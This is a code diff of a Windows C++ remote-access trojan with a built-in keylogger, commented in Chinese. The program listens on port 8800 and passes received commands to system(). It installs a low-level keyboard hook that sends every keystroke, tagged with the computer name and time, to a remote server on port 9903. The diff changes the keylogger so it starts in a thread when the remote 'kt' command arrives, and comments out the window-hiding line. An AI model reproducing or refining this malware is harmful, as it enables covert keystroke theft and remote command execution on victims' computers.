@@ -83,38 +83,6 @@ void handshake()
     }
 }
 
-/*
- *@执行来自Hack的命令
- */
-void Main()
-{
-    for (;;)
-    {
-        char s[MaxCommand];
-        strcpy(s, net::Listen(8800));
-        printf("%s\n", s);
-        if (s[0] == 'c' && s[1] == ',')
-        {
-            char command_tmp[MaxCommand];
-            strcpy(command_tmp, strtok(s + 2, "\0"));
-            printf("%s\n", command_tmp);
-            system(command_tmp);
-        }
-        else if (strcmp(s, "check") == 0)
-        {
-            net::Send(server_ip, 9902, "online");
-        }
-        else if (strcmp(s, "kt") == 0)
-        {
-            key_down_running = true;
-        }
-        else if (strcmp(s, "kf") == 0)
-        {
-            key_down_running = false;
-        }
-    }
-}
-
 /**
  *@键盘钩子
  */
@@ -180,9 +148,9 @@ LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ L
             strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", localtime(&now));
             char message_tmp[1005];
             sprintf(message_tmp, "[%s %s]:+%s", ComputerName, datetime, KeyWord[ks->vkCode]);
-            if (key_down_running)
+            if (!net::Send(server_ip, 9903, message_tmp))
             {
-                net::SendNoWait(server_ip, 9903, message_tmp);
+                key_down_running = false;
             }
         }
     }
@@ -197,9 +165,9 @@ LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ L
             strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", localtime(&now));
             char message_tmp[1005];
             sprintf(message_tmp, "[%s %s]:-%s", ComputerName, datetime, KeyWord[ks->vkCode]);
-            if (key_down_running)
+            if (!net::Send(server_ip, 9903, message_tmp))
             {
-                net::SendNoWait(server_ip, 9903, message_tmp);
+                key_down_running = false;
             }
             num = 1;
         }
@@ -210,20 +178,25 @@ LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ L
             strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", localtime(&now));
             char message_tmp[1005];
             sprintf(message_tmp, "[%s %s]:-%s", ComputerName, datetime, KeyWord[ks->vkCode]);
-            if (key_down_running)
+            if (!net::Send(server_ip, 9903, message_tmp))
             {
-                net::SendNoWait(server_ip, 9903, message_tmp);
+                key_down_running = false;
             }
         }
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
-int keyWord()
+void keyWord()
 {
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleA(NULL), NULL);
     MSG msg;
     for (;;)
     {
+        if (!key_down_running)
+        {
+            break;
+        }
+        printf("KeyDown Running !\n");
         if (PeekMessageA(&msg, NULL, NULL, NULL, PM_REMOVE))
         {
             TranslateMessage(&msg);
@@ -238,15 +211,48 @@ int keyWord()
 }
 } // namespace KeyDown
 
+/*
+ *@执行来自Hack的命令
+ */
+void Main()
+{
+    for (;;)
+    {
+        char s[MaxCommand];
+        strcpy(s, net::Listen(8800));
+        printf("%s\n", s);
+        if (s[0] == 'c' && s[1] == ',')
+        {
+            char command_tmp[MaxCommand];
+            strcpy(command_tmp, strtok(s + 2, "\0"));
+            printf("%s\n", command_tmp);
+            system(command_tmp);
+        }
+        else if (strcmp(s, "check") == 0)
+        {
+            net::Send(server_ip, 9902, "online");
+        }
+        else if (strcmp(s, "kt") == 0)
+        {
+            key_down_running = true;
+            std::thread KeyDownBackground(KeyDown::keyWord);
+            KeyDownBackground.detach();
+        }
+        else if (strcmp(s, "kf") == 0)
+        {
+            key_down_running = false;
+        }
+    }
+}
+
 int main(int argv, char *argc[])
 {
     getchar();
-    ShowWindow(GetForegroundWindow(), 0);
+    // ShowWindow(GetForegroundWindow(), 0);
     DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
     GetComputerNameA(ComputerName, &size);
     std::thread hand(handshake);
     std::thread background(Main);
-    std::thread keydown_listen(KeyDown::keyWord);
     for (;;)
     {
     }
